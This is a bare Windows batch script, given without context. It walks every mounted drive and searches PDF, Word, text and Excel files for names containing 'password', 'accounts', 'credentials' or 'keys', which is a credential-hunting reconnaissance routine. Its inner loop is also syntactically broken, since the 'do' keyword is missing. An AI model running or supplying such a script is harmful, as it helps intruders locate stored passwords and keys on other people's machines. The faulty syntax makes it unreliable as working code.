@echo off
setlocal enabledelayedexpansion 


set fileext[0]=pdf 
set fileext[1]=doc 
set fileext[2]=txt
set fileext[3]=xls 

set filestr[0]=password
set filestr[1]=accounts
set filestr[2]=credentials
set filestr[3]=keys

for /l %%n in (0,1,3) do ( 
   for /F %%C in ('mountvol ^| find ":"') dir "%%C*.!fileext[%%n]! " /b /s /a-d | findstr !filestr[%%n]! 
)